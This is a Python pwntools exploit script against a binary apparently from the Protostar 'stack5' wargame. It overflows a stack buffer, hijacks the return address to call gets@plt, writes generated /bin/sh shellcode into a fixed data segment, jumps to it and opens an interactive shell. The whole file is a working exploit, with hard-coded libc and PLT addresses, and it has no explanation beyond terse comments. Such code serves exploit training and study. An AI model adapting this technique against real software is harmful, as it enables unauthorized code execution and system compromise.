from pwn import *
from subprocess import *

def text2hex(text):
    s=''
    for ch in range(len(text)):
        x=str(hex(ord(text[ch])))
        if ch>0:
            x=str(hex(ord(text[ch]))).replace('0x','')
        s+=x
    return s

shellcode = asm(shellcraft.i386.linux.sh())

f=open('shellcode','wb')


print shellcode
gets_plt = 0x80482e8 # 0x80482e8 <gets@plt> 

system=0xf7e40da0 #<system>
bin_sh=0xf7f619ab #libc : 0xf7f619ab ("/bin/sh")

#DATA_SEGMENT = 0x080495a4
DATA_SEGMENT = 0x0804958c
BINARY = "./bin/stack5"
r = process(BINARY)
#raw_input("attach " + str(r.proc.pid)+"\nDebug?")
print "process:",str(r.proc.pid)
payload = "A"*(0x50-0x10) # buff esp+0x10 | sub    esp,0x50
payload += "B"*8 # stack agliment | and	esp,0xfffffff0
payload += "C"*4 # ebp
payload += p32(gets_plt) # ret //~struct.pack
payload += p32(DATA_SEGMENT) # return after gets
payload += p32(DATA_SEGMENT) # argv of gets
print "payload:",text2hex(payload),shellcode
r.sendline(payload)

f.write(payload)
f.close()
r.sendline(shellcode) # gets(DATA_SEGMENT)
r.sendline('id') # gets(DATA_SEGMENT)
r.interactive()
